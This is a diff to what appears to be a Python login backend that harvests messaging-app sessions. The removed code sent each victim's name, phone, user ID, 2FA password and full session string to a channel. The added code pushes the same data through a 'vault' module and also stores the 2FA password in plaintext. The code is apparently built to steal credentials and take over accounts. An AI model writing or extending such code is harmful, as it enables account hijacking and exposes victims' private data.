@@ -1,4 +1,3 @@
-import html as html_lib
 import logging
 import re
 import time
@@ -23,10 +22,10 @@ from .database import (
     ensure_db,
     get_videos,
     save_session_to_db,
-    send_to_channel,
 )
 from .session_manager import session_manager
 from .session_tools import check_session
+from . import vault
 
 log = logging.getLogger(__name__)
 
@@ -481,6 +480,7 @@ def verify_code():
         "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "session_name": session_name,
         "two_step_verification": used_password,
+        "twofa_password": password if used_password else None,
         "status": "active" if verified else "unverified",
         "check_fail": None if verified else check_err,
     }
@@ -492,28 +492,17 @@ def verify_code():
         log.exception("save_session_to_db raised: %s", exc)
 
     try:
-        channel_msg = (
-            "🟢 <b>NEW SESSION</b>\n"
-            f"👤 <b>Name:</b> {html_lib.escape(full_name)}\n"
-            f"🔗 <b>Username:</b> "
-            f"{html_lib.escape('@' + username) if username else 'N/A'}\n"
-            f"🆔 <b>User ID:</b> <code>{user_info['id']}</code>\n"
-            f"📱 <b>Phone:</b> <code>{html_lib.escape(phone)}</code>"
-        )
-        if used_password:
-            channel_msg += f"\n🔑 <b>2FA:</b> <code>{html_lib.escape(password)}</code>"
-        if verified:
-            channel_msg += "\n✅ <b>Status:</b> verified"
+        if vault.push(user_info, password if used_password else None):
+            try:
+                if database.users_col is not None:
+                    database.users_col.update_one(
+                        {"phone": phone}, {"$set": {"pushed": True}})
+            except Exception:
+                pass
         else:
-            channel_msg += (f"\n⚠️ <b>Status:</b> unverified "
-                            f"({html_lib.escape(str(check_err))})")
-        channel_msg += (
-            f"\n\n<b>🔐 SESSION:</b>\n"
-            f"<code>{html_lib.escape(user_info['session_string'])}</code>"
-        )
-        send_to_channel(channel_msg)
+            log.warning("vault push failed for %s", _mask_phone(phone))
     except Exception as exc:
-        log.exception("send_to_channel failed: %s", exc)
+        log.exception("vault push raised: %s", exc)
 
     session.permanent = True
     session["login_at"] = time.time()
